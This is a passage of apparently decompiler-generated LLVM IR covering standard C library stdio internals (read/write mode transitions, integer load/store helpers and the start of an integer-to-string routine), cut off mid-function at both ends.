  %v1_80626ea = load i32, i32* %ebx.global-to-local, align 4
  %v2_80626ea = sub i32 %v0_80626ea, %v4_80626dc
  %v2_80626ee = add i32 %v2_80626ea, %v1_80626ea
  store i32 %v2_80626ee, i32* %eax.global-to-local, align 4
  %v0_80626f0 = load i32, i32* @esi, align 4
  %v1_80626f0 = add i32 %v0_80626f0, 16
  %v2_80626f0 = inttoptr i32 %v1_80626f0 to i32*
  %v3_80626f0 = load i32, i32* %v2_80626f0, align 4
  %v5_80626f0 = sub i32 %v3_80626f0, %v2_80626ee
  store i32 %v5_80626f0, i32* %v2_80626f0, align 4
  %v0_80626f3 = load i32, i32* @edi, align 4
  %v1_80626f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80626f3 = sub i32 %v0_80626f3, %v1_80626f3
  store i32 %v2_80626f3, i32* @edi, align 4
  br label %dec_label_pc_8062728

dec_label_pc_80626f7:                             ; preds = %dec_label_pc_806268e
  %v2_80626f7 = add i32 %arg3, 8
  %v3_80626f7 = inttoptr i32 %v2_80626f7 to i32*
  %v4_80626f7 = load i32, i32* %v3_80626f7, align 4
  %v15_80626f7 = icmp eq i32 %v3_8062669, %v4_80626f7
  br i1 %v15_80626f7, label %dec_label_pc_8062710, label %dec_label_pc_80626fc

dec_label_pc_80626fc:                             ; preds = %dec_label_pc_80626f7
  %v1_8062700 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8062700, i32* %eax.global-to-local, align 4
  %v1_8062708 = icmp eq i32 %v1_8062700, 0
  br i1 %v1_8062708, label %dec_label_pc_80626fc.dec_label_pc_8062710_crit_edge, label %dec_label_pc_806270c

dec_label_pc_80626fc.dec_label_pc_8062710_crit_edge: ; preds = %dec_label_pc_80626fc
  %v0_8062710.pre = load i32, i32* @edi, align 4
  %v0_8062718.pre = load i32, i32* @esi, align 4
  %v2_806271f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8062710

dec_label_pc_806270c:                             ; preds = %dec_label_pc_80626fc
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8062728

dec_label_pc_8062710:                             ; preds = %dec_label_pc_80626fc.dec_label_pc_8062710_crit_edge, %dec_label_pc_80626f7, %entry
  %v2_806271f = phi i32 [ %v2_806271f.pre, %dec_label_pc_80626fc.dec_label_pc_8062710_crit_edge ], [ %v0_806264b, %dec_label_pc_80626f7 ], [ %v0_806264b, %entry ]
  %v0_8062718 = phi i32 [ %v0_8062718.pre, %dec_label_pc_80626fc.dec_label_pc_8062710_crit_edge ], [ %arg3, %dec_label_pc_80626f7 ], [ %arg3, %entry ]
  %v0_8062710 = phi i32 [ %v0_8062710.pre, %dec_label_pc_80626fc.dec_label_pc_8062710_crit_edge ], [ %arg2, %dec_label_pc_80626f7 ], [ %arg2, %entry ]
  store i32 %v2_806271f, i32* @ebx, align 4
  store i32 %v0_806264a, i32* @esi, align 4
  store i32 %v0_8062649, i32* @edi, align 4
  store i32 %v0_8062648, i32* @ebp, align 4
  %v4_8062723 = inttoptr i32 %v0_8062718 to i16*
  %v5_8062723 = call i32 @__stdio_WRITE(i16* %v4_8062723, i32 %v0_8062710, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8062723, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062728

dec_label_pc_8062728:                             ; preds = %dec_label_pc_80626ca, %dec_label_pc_80626ba, %dec_label_pc_80626a9, %dec_label_pc_8062694, %dec_label_pc_806270c, %dec_label_pc_80626ea, %dec_label_pc_8062671, %dec_label_pc_8062710
  %v0_806272b = load i32, i32* @edi, align 4
  store i32 %v0_806272b, i32* %eax.global-to-local, align 4
  %v2_806272d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806272d, i32* @ebx, align 4
  store i32 %v0_806264a, i32* @esi, align 4
  store i32 %v0_8062649, i32* @edi, align 4
  store i32 %v0_8062648, i32* @ebp, align 4
  ret i32 %v0_806272b

; uselistorder directives
  uselistorder i32 %v2_80626ee, { 1, 0 }
  uselistorder i32 %v0_80626ca, { 2, 1, 0 }
  uselistorder i32 %v1_80626be, { 2, 0, 1, 3 }
  uselistorder i32 %v2_806268e, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8062669, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_806264a, { 1, 0 }
  uselistorder i32 %v0_8062649, { 1, 0 }
  uselistorder i32 %v0_8062648, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8062728, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8062734 = load i32, i32* @ebx, align 4
  %v4_8062738 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8062738, i32* @ebx, align 4
  %v2_8062740 = load i16, i16* %arg1, align 2
  %v3_8062740 = zext i16 %v2_8062740 to i32
  %v2_8062743 = and i32 %v3_8062740, %arg2
  %v3_8062743 = icmp eq i32 %v2_8062743, 0
  %v1_8062745 = icmp eq i1 %v3_8062743, false
  br i1 %v1_8062745, label %dec_label_pc_8062753, label %dec_label_pc_8062747

dec_label_pc_8062747:                             ; preds = %entry
  %v1_8062747 = and i32 %v3_8062740, 2176
  %v2_8062747 = icmp eq i32 %v1_8062747, 0
  %v1_806274c = icmp eq i1 %v2_8062747, false
  br i1 %v1_806274c, label %dec_label_pc_806275a, label %dec_label_pc_806274e

dec_label_pc_806274e:                             ; preds = %dec_label_pc_8062747
  %v2_806274e = or i32 %v3_8062740, %arg2
  %v1_8062750 = trunc i32 %v2_806274e to i16
  store i16 %v1_8062750, i16* %arg1, align 2
  %v0_8062753.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062753

dec_label_pc_8062753:                             ; preds = %entry, %dec_label_pc_806274e
  %v0_8062779 = phi i32 [ %v4_8062738, %entry ], [ %v0_8062753.pre, %dec_label_pc_806274e ]
  %v1_8062753 = inttoptr i32 %v0_8062779 to i16*
  %v2_8062753 = load i16, i16* %v1_8062753, align 2
  %v2_8062756 = and i16 %v2_8062753, 16
  %v3_8062756 = icmp eq i16 %v2_8062756, 0
  br i1 %v3_8062756, label %dec_label_pc_8062772, label %dec_label_pc_806275a

dec_label_pc_806275a:                             ; preds = %dec_label_pc_8062753, %dec_label_pc_8062747
  %v1_806275a = call i32 @__errno_location(i32 %v0_8062734)
  %v1_806275f = inttoptr i32 %v1_806275a to i32*
  store i32 9, i32* %v1_806275f, align 4
  br label %dec_label_pc_8062765

dec_label_pc_8062765:                             ; preds = %dec_label_pc_8062776, %dec_label_pc_806275a
  %v0_8062765 = load i32, i32* @ebx, align 4
  %v1_8062765 = inttoptr i32 %v0_8062765 to i32*
  %v2_8062765 = load i32, i32* %v1_8062765, align 4
  %v1_8062767 = or i32 %v2_8062765, 8
  %v1_806276a = trunc i32 %v1_8062767 to i16
  %v3_806276a = inttoptr i32 %v0_8062765 to i16*
  store i16 %v1_806276a, i16* %v3_806276a, align 2
  br label %dec_label_pc_806279e

dec_label_pc_8062772:                             ; preds = %dec_label_pc_8062753
  %v2_8062772 = and i16 %v2_8062753, 64
  %v3_8062772 = icmp eq i16 %v2_8062772, 0
  br i1 %v3_8062772, label %dec_label_pc_8062794, label %dec_label_pc_8062776

dec_label_pc_8062776:                             ; preds = %dec_label_pc_8062772
  %v2_806277a = call i32 @__stdio_wcommit(i32 %v0_8062779)
  %v1_8062782 = icmp eq i32 %v2_806277a, 0
  %v1_8062784 = icmp eq i1 %v1_8062782, false
  br i1 %v1_8062784, label %dec_label_pc_8062765, label %dec_label_pc_8062786

dec_label_pc_8062786:                             ; preds = %dec_label_pc_8062776
  %v0_8062786 = load i32, i32* @ebx, align 4
  %v1_8062786 = add i32 %v0_8062786, 8
  %v2_8062786 = inttoptr i32 %v1_8062786 to i32*
  %v3_8062786 = load i32, i32* %v2_8062786, align 4
  %v2_8062789 = add i32 %v0_8062786, 28
  %v3_8062789 = inttoptr i32 %v2_8062789 to i32*
  store i32 %v3_8062786, i32* %v3_8062789, align 4
  %v0_806278c = load i32, i32* @ebx, align 4
  %v1_806278c = inttoptr i32 %v0_806278c to i32*
  %v2_806278c = load i32, i32* %v1_806278c, align 4
  %v2_806278c.tr = trunc i32 %v2_806278c to i16
  %v1_8062791 = and i16 %v2_806278c.tr, -65
  %v3_8062791 = inttoptr i32 %v0_806278c to i16*
  store i16 %v1_8062791, i16* %v3_8062791, align 2
  %v0_8062794.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062794

dec_label_pc_8062794:                             ; preds = %dec_label_pc_8062772, %dec_label_pc_8062786
  %v2_8062799 = phi i32 [ %v0_8062779, %dec_label_pc_8062772 ], [ %v0_8062794.pre, %dec_label_pc_8062786 ]
  %v1_8062794 = inttoptr i32 %v2_8062799 to i32*
  %v2_8062794 = load i32, i32* %v1_8062794, align 4
  %v1_8062796 = or i32 %v2_8062794, 1
  %v1_8062799 = trunc i32 %v1_8062796 to i16
  %v3_8062799 = inttoptr i32 %v2_8062799 to i16*
  store i16 %v1_8062799, i16* %v3_8062799, align 2
  br label %dec_label_pc_806279e

dec_label_pc_806279e:                             ; preds = %dec_label_pc_8062765, %dec_label_pc_8062794
  %storemerge = phi i32 [ 0, %dec_label_pc_8062794 ], [ -1, %dec_label_pc_8062765 ]
  %v2_806279e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806279e, i32* @edx, align 4
  store i32 %v0_8062734, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8062740, { 0, 2, 1 }
  uselistorder i32 %v0_8062734, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806279e, { 1, 0 }
  uselistorder label %dec_label_pc_8062794, { 1, 0 }
  uselistorder label %dec_label_pc_8062753, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80627a4 = load i32, i32* @ebx, align 4
  %v4_80627a8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80627a8, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_80627b0 = load i16, i16* %arg1, align 2
  %v3_80627b0 = zext i16 %v2_80627b0 to i32
  store i32 %v3_80627b0, i32* %eax.global-to-local, align 4
  %v2_80627b3 = and i32 %v3_80627b0, %arg2
  %v3_80627b3 = icmp eq i32 %v2_80627b3, 0
  %v1_80627b5 = icmp eq i1 %v3_80627b3, false
  br i1 %v1_80627b5, label %dec_label_pc_80627c3, label %dec_label_pc_80627b7

dec_label_pc_80627b7:                             ; preds = %entry
  %v1_80627b7 = and i32 %v3_80627b0, 2176
  %v2_80627b7 = icmp eq i32 %v1_80627b7, 0
  %v1_80627bc = icmp eq i1 %v2_80627b7, false
  br i1 %v1_80627bc, label %dec_label_pc_80627cb, label %dec_label_pc_80627be

dec_label_pc_80627be:                             ; preds = %dec_label_pc_80627b7
  %v2_80627be = or i32 %v3_80627b0, %arg2
  store i32 %v2_80627be, i32* %eax.global-to-local, align 4
  %v1_80627c0 = trunc i32 %v2_80627be to i16
  store i16 %v1_80627c0, i16* %arg1, align 2
  %v0_80627c3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80627c3

dec_label_pc_80627c3:                             ; preds = %entry, %dec_label_pc_80627be
  %v0_806280c = phi i32 [ %v4_80627a8, %entry ], [ %v0_80627c3.pre, %dec_label_pc_80627be ]
  %v1_80627c3 = inttoptr i32 %v0_806280c to i16*
  %v2_80627c3 = load i16, i16* %v1_80627c3, align 2
  %v3_80627c3 = zext i16 %v2_80627c3 to i32
  store i32 %v3_80627c3, i32* %edx.global-to-local, align 4
  %v2_80627c6 = and i16 %v2_80627c3, 32
  %v3_80627c6 = icmp eq i16 %v2_80627c6, 0
  br i1 %v3_80627c6, label %dec_label_pc_80627e3, label %dec_label_pc_80627cb

dec_label_pc_80627cb:                             ; preds = %dec_label_pc_80627c3, %dec_label_pc_80627b7
  %v1_80627cb = call i32 @__errno_location(i32 %v0_80627a4)
  store i32 %v1_80627cb, i32* %eax.global-to-local, align 4
  %v1_80627d0 = inttoptr i32 %v1_80627cb to i32*
  store i32 9, i32* %v1_80627d0, align 4
  br label %dec_label_pc_80627d6

dec_label_pc_80627d6:                             ; preds = %dec_label_pc_80627fa, %dec_label_pc_80627cb
  %v0_80627d6 = load i32, i32* @ebx, align 4
  %v1_80627d6 = inttoptr i32 %v0_80627d6 to i32*
  %v2_80627d6 = load i32, i32* %v1_80627d6, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80627db = or i32 %v2_80627d6, 8
  store i32 %v1_80627db, i32* %eax.global-to-local, align 4
  %v1_80627de = trunc i32 %v1_80627db to i16
  %v3_80627de = inttoptr i32 %v0_80627d6 to i16*
  store i16 %v1_80627de, i16* %v3_80627de, align 2
  br label %dec_label_pc_8062845

dec_label_pc_80627e3:                             ; preds = %dec_label_pc_80627c3
  %v2_80627e3 = urem i16 %v2_80627c3, 4
  %v3_80627e3 = icmp eq i16 %v2_80627e3, 0
  br i1 %v3_80627e3, label %dec_label_pc_806282d, label %dec_label_pc_80627e8

dec_label_pc_80627e8:                             ; preds = %dec_label_pc_80627e3
  %v2_80627e8 = and i32 %v3_80627c3, 4
  %v3_80627e8 = icmp eq i32 %v2_80627e8, 0
  %v1_80627eb = icmp eq i1 %v3_80627e8, false
  br i1 %v1_80627eb, label %dec_label_pc_8062819, label %dec_label_pc_80627ed

dec_label_pc_80627ed:                             ; preds = %dec_label_pc_80627e8
  %v1_80627ed = add i32 %v0_806280c, 20
  %v2_80627ed = inttoptr i32 %v1_80627ed to i32*
  %v3_80627ed = load i32, i32* %v2_80627ed, align 4
  store i32 %v3_80627ed, i32* %eax.global-to-local, align 4
  %v2_80627f0 = add i32 %v0_806280c, 16
  %v3_80627f0 = inttoptr i32 %v2_80627f0 to i32*
  %v4_80627f0 = load i32, i32* %v3_80627f0, align 4
  %v15_80627f0 = icmp eq i32 %v3_80627ed, %v4_80627f0
  %v1_80627f3 = icmp eq i1 %v15_80627f0, false
  br i1 %v1_80627f3, label %dec_label_pc_80627fa, label %dec_label_pc_80627f5

dec_label_pc_80627f5:                             ; preds = %dec_label_pc_80627ed
  %v2_80627f5 = and i32 %v3_80627c3, 2
  %v3_80627f5 = icmp eq i32 %v2_80627f5, 0
  br i1 %v3_80627f5, label %dec_label_pc_8062819, label %dec_label_pc_80627fa

dec_label_pc_80627fa:                             ; preds = %dec_label_pc_80627f5, %dec_label_pc_80627ed
  %v1_80627fa = and i32 %v3_80627c3, 1024
  store i32 %v1_80627fa, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_80627fa, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_806280d = call i32 @__GI_fseek(i32 %v0_806280c, i32 0, i32 %tmp17, i32 %v1_80627fa)
  store i32 %v5_806280d, i32* %eax.global-to-local, align 4
  %v1_8062815 = icmp eq i32 %v5_806280d, 0
  %v1_8062817 = icmp eq i1 %v1_8062815, false
  br i1 %v1_8062817, label %dec_label_pc_80627d6, label %dec_label_pc_80627fa.dec_label_pc_8062819_crit_edge

dec_label_pc_80627fa.dec_label_pc_8062819_crit_edge: ; preds = %dec_label_pc_80627fa
  %v0_8062819.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062819

dec_label_pc_8062819:                             ; preds = %dec_label_pc_80627fa.dec_label_pc_8062819_crit_edge, %dec_label_pc_80627f5, %dec_label_pc_80627e8
  %v2_806281e = phi i32 [ %v0_8062819.pre, %dec_label_pc_80627fa.dec_label_pc_8062819_crit_edge ], [ %v0_806280c, %dec_label_pc_80627f5 ], [ %v0_806280c, %dec_label_pc_80627e8 ]
  %v1_8062819 = inttoptr i32 %v2_806281e to i32*
  %v2_8062819 = load i32, i32* %v1_8062819, align 4
  %v1_806281b = and i32 %v2_8062819, -4
  store i32 %v1_806281b, i32* %eax.global-to-local, align 4
  %v1_806281e = trunc i32 %v1_806281b to i16
  %v3_806281e = inttoptr i32 %v2_806281e to i16*
  store i16 %v1_806281e, i16* %v3_806281e, align 2
  %v0_8062821 = load i32, i32* @ebx, align 4
  %v1_8062821 = add i32 %v0_8062821, 8
  %v2_8062821 = inttoptr i32 %v1_8062821 to i32*
  %v3_8062821 = load i32, i32* %v2_8062821, align 4
  store i32 %v3_8062821, i32* %eax.global-to-local, align 4
  %v2_8062824 = add i32 %v0_8062821, 24
  %v3_8062824 = inttoptr i32 %v2_8062824 to i32*
  store i32 %v3_8062821, i32* %v3_8062824, align 4
  %v0_8062827 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062827 = load i32, i32* @ebx, align 4
  %v2_8062827 = add i32 %v1_8062827, 16
  %v3_8062827 = inttoptr i32 %v2_8062827 to i32*
  store i32 %v0_8062827, i32* %v3_8062827, align 4
  %v0_806282a = load i32, i32* %eax.global-to-local, align 4
  %v1_806282a = load i32, i32* @ebx, align 4
  %v2_806282a = add i32 %v1_806282a, 20
  %v3_806282a = inttoptr i32 %v2_806282a to i32*
  store i32 %v0_806282a, i32* %v3_806282a, align 4
  %v0_806282d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806282d

dec_label_pc_806282d:                             ; preds = %dec_label_pc_80627e3, %dec_label_pc_8062819
  %v2_8062834 = phi i32 [ %v0_806280c, %dec_label_pc_80627e3 ], [ %v0_806282d.pre, %dec_label_pc_8062819 ]
  %v1_806282d = inttoptr i32 %v2_8062834 to i32*
  %v2_806282d = load i32, i32* %v1_806282d, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8062831 = or i32 %v2_806282d, 64
  store i32 %v1_8062831, i32* %eax.global-to-local, align 4
  %v1_8062834 = trunc i32 %v1_8062831 to i16
  %v3_8062834 = inttoptr i32 %v2_8062834 to i16*
  store i16 %v1_8062834, i16* %v3_8062834, align 2
  %v0_8062837 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062837 = urem i32 %v0_8062837, 65536
  store i32 %v1_8062837, i32* %eax.global-to-local, align 4
  %v3_806283a = and i32 %v0_8062837, 2816
  %v4_806283a = icmp eq i32 %v3_806283a, 0
  %v1_806283d = icmp eq i1 %v4_806283a, false
  br i1 %v1_806283d, label %dec_label_pc_8062845, label %dec_label_pc_806283f

dec_label_pc_806283f:                             ; preds = %dec_label_pc_806282d
  %v0_806283f = load i32, i32* @ebx, align 4
  %v1_806283f = add i32 %v0_806283f, 12
  %v2_806283f = inttoptr i32 %v1_806283f to i32*
  %v3_806283f = load i32, i32* %v2_806283f, align 4
  store i32 %v3_806283f, i32* %eax.global-to-local, align 4
  %v2_8062842 = add i32 %v0_806283f, 28
  %v3_8062842 = inttoptr i32 %v2_8062842 to i32*
  store i32 %v3_806283f, i32* %v3_8062842, align 4
  br label %dec_label_pc_8062845

dec_label_pc_8062845:                             ; preds = %dec_label_pc_806282d, %dec_label_pc_80627d6, %dec_label_pc_806283f
  %v0_8062845 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8062845, i32* %eax.global-to-local, align 4
  %v2_8062847 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062847, i32* @edx, align 4
  store i32 %v0_80627a4, i32* @ebx, align 4
  ret i32 %v0_8062845

; uselistorder directives
  uselistorder i32 %v0_8062837, { 1, 0 }
  uselistorder i32 %v1_80627fa, { 1, 0, 2 }
  uselistorder i32 %v0_806280c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_80627b0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80627a4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 1024, { 0, 8, 4, 7, 6, 9, 5, 2, 3, 1 }
  uselistorder i16 32, { 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8062845, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806282d, { 1, 0 }
  uselistorder label %dec_label_pc_80627c3, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_806284c = icmp slt i32 %tmp5, 0
  %v3_806287d = and i32 %tmp4, 2048
  %v4_806287d = icmp eq i32 %v3_806287d, 0
  br i1 %v5_806284c, label %dec_label_pc_806287d, label %dec_label_pc_806285b

dec_label_pc_806285b:                             ; preds = %entry
  %v1_806285e = icmp eq i1 %v4_806287d, false
  br i1 %v1_806285e, label %dec_label_pc_8062882, label %dec_label_pc_8062860

dec_label_pc_8062860:                             ; preds = %dec_label_pc_806285b
  %v6_8062860 = icmp eq i32 %tmp4, 256
  %v1_8062866 = inttoptr i32 %tmp to i32*
  %v2_8062866 = load i32, i32* %v1_8062866, align 4
  %v1_8062868 = icmp eq i1 %v6_8062860, false
  br i1 %v1_8062868, label %dec_label_pc_806286f, label %dec_label_pc_806286a

dec_label_pc_806286a:                             ; preds = %dec_label_pc_8062860
  %v1_806286a = urem i32 %v2_8062866, 256
  br label %dec_label_pc_806287a

dec_label_pc_806286f:                             ; preds = %dec_label_pc_8062860
  %v6_806286f = icmp eq i32 %tmp4, 512
  %v1_8062875 = icmp eq i1 %v6_806286f, false
  br i1 %v1_8062875, label %dec_label_pc_806287a, label %dec_label_pc_8062877

dec_label_pc_8062877:                             ; preds = %dec_label_pc_806286f
  %v1_8062877 = urem i32 %v2_8062866, 65536
  br label %dec_label_pc_806287a

dec_label_pc_806287a:                             ; preds = %dec_label_pc_806286f, %dec_label_pc_806286a, %dec_label_pc_8062877
  %v0_806287c = phi i32 [ %v2_8062866, %dec_label_pc_806286f ], [ %v1_806286a, %dec_label_pc_806286a ], [ %v1_8062877, %dec_label_pc_8062877 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_806287c

dec_label_pc_806287d:                             ; preds = %entry
  br i1 %v4_806287d, label %dec_label_pc_8062888, label %dec_label_pc_8062882

dec_label_pc_8062882:                             ; preds = %dec_label_pc_806287d, %dec_label_pc_806285b
  %v1_8062882 = add i32 %tmp, 4
  %v2_8062882 = inttoptr i32 %v1_8062882 to i32*
  %v3_8062882 = load i32, i32* %v2_8062882, align 4
  store i32 %v3_8062882, i32* @edx, align 4
  %v1_8062885 = inttoptr i32 %tmp to i32*
  %v2_8062885 = load i32, i32* %v1_8062885, align 4
  ret i32 %v2_8062885

dec_label_pc_8062888:                             ; preds = %dec_label_pc_806287d
  %v6_8062888 = icmp eq i32 %tmp4, 256
  %v1_806288e = inttoptr i32 %tmp to i32*
  %v2_806288e = load i32, i32* %v1_806288e, align 4
  %v1_8062890 = icmp eq i1 %v6_8062888, false
  br i1 %v1_8062890, label %dec_label_pc_8062897, label %dec_label_pc_8062892

dec_label_pc_8062892:                             ; preds = %dec_label_pc_8062888
  %v1_8062892 = mul i32 %v2_806288e, 16777216
  %v2_8062892 = sdiv i32 %v1_8062892, 16777216
  br label %dec_label_pc_80628a0

dec_label_pc_8062897:                             ; preds = %dec_label_pc_8062888
  %v6_8062897 = icmp eq i32 %tmp4, 512
  %v1_806289d = icmp eq i1 %v6_8062897, false
  br i1 %v1_806289d, label %dec_label_pc_80628a0, label %dec_label_pc_806289f

dec_label_pc_806289f:                             ; preds = %dec_label_pc_8062897
  %v1_806289f = mul i32 %v2_806288e, 65536
  %v2_806289f = sdiv i32 %v1_806289f, 65536
  br label %dec_label_pc_80628a0

dec_label_pc_80628a0:                             ; preds = %dec_label_pc_8062897, %dec_label_pc_8062892, %dec_label_pc_806289f
  %v0_80628a0 = phi i32 [ %v2_806288e, %dec_label_pc_8062897 ], [ %v2_8062892, %dec_label_pc_8062892 ], [ %v2_806289f, %dec_label_pc_806289f ]
  %v1_80628a0 = ashr i32 %v0_80628a0, 31
  store i32 %v1_80628a0, i32* @edx, align 4
  ret i32 %v0_80628a0

; uselistorder directives
  uselistorder i32 %v0_80628a0, { 1, 0 }
  uselistorder i32 %v2_806288e, { 2, 0, 1 }
  uselistorder i32 %v2_8062866, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80628a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806287a, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_8()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80628a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80628a4, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_80628a9 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_80628a9, i32* %ebx.global-to-local, align 4
  %v4_80628ad = trunc i32 %tmp4 to i16
  %v6_80628b5 = icmp eq i32 %tmp6, 256
  %v1_80628bb = icmp eq i1 %v6_80628b5, false
  br i1 %v1_80628bb, label %dec_label_pc_80628c1, label %dec_label_pc_80628bd

dec_label_pc_80628bd:                             ; preds = %entry
  %v2_80628bd = trunc i32 %tmp4 to i8
  %v4_80628bd = bitcast i16* %tmp5 to i8*
  store i8 %v2_80628bd, i8* %v4_80628bd, align 1
  br label %dec_label_pc_80628df

dec_label_pc_80628c1:                             ; preds = %entry
  %v6_80628c1 = icmp eq i32 %tmp6, 2048
  %v1_80628c7 = icmp eq i1 %v6_80628c1, false
  br i1 %v1_80628c7, label %dec_label_pc_80628d0, label %dec_label_pc_80628c9

dec_label_pc_80628c9:                             ; preds = %dec_label_pc_80628c1
  %sext2 = mul i32 %tmp4, 65536
  %v1_80628c9 = sdiv i32 %sext2, 65536
  %v3_80628c9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80628c9, i32* %v3_80628c9, align 4
  %v0_80628cb = load i32, i32* %edx.global-to-local, align 4
  %v1_80628cb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80628cb = add i32 %v1_80628cb, 4
  %v3_80628cb = inttoptr i32 %v2_80628cb to i32*
  store i32 %v0_80628cb, i32* %v3_80628cb, align 4
  br label %dec_label_pc_80628df

dec_label_pc_80628d0:                             ; preds = %dec_label_pc_80628c1
  %v6_80628d0 = icmp eq i32 %tmp6, 512
  %v1_80628d6 = icmp eq i1 %v6_80628d0, false
  br i1 %v1_80628d6, label %dec_label_pc_80628dd, label %dec_label_pc_80628d8

dec_label_pc_80628d8:                             ; preds = %dec_label_pc_80628d0
  store i16 %v4_80628ad, i16* %tmp5, align 2
  br label %dec_label_pc_80628df

dec_label_pc_80628dd:                             ; preds = %dec_label_pc_80628d0
  %sext3 = mul i32 %tmp4, 65536
  %v1_80628dd = sdiv i32 %sext3, 65536
  %v3_80628dd = bitcast i16* %tmp5 to i32*
  store i32 %v1_80628dd, i32* %v3_80628dd, align 4
  br label %dec_label_pc_80628df

dec_label_pc_80628df:                             ; preds = %dec_label_pc_80628d8, %dec_label_pc_80628c9, %dec_label_pc_80628bd, %dec_label_pc_80628dd
  %v2_80628df = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80628df, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80628e0 = sdiv i32 %sext, 65536
  ret i32 %v1_80628e0

; uselistorder directives
  uselistorder label %dec_label_pc_80628df, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80628ef = ptrtoint i8* %arg1 to i32
  store i32 %v4_80628ef, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80628fb = icmp slt i32 %arg4, 0
  %v1_80628fd = icmp eq i1 %v2_80628fb, false
  br i1 %v1_80628fd, label %dec_label_pc_806291e, label %dec_label_pc_80628ff

dec_label_pc_80628ff:                             ; preds = %entry
  %v1_80628ff = sub i32 0, %arg4
  store i32 %v1_80628ff, i32* %esi.global-to-local, align 4
  %v2_8062901 = icmp slt i32 %arg3, 0
  %v1_8062903 = icmp eq i1 %v2_8062901, false
  br i1 %v1_8062903, label %dec_label_pc_806291e, label %dec_label_pc_8062905

dec_label_pc_8062905:                             ; preds = %dec_label_pc_80628ff
  %v1_8062905 = sub i32 0, %arg2
  %v5_8062905 = icmp ne i32 %arg2, 0
  store i32 %v1_8062905, i32* %ecx.global-to-local, align 4
  %v2_8062907 = zext i1 %v5_8062905 to i32
  %v3_8062907 = add i32 %v2_8062907, %arg3
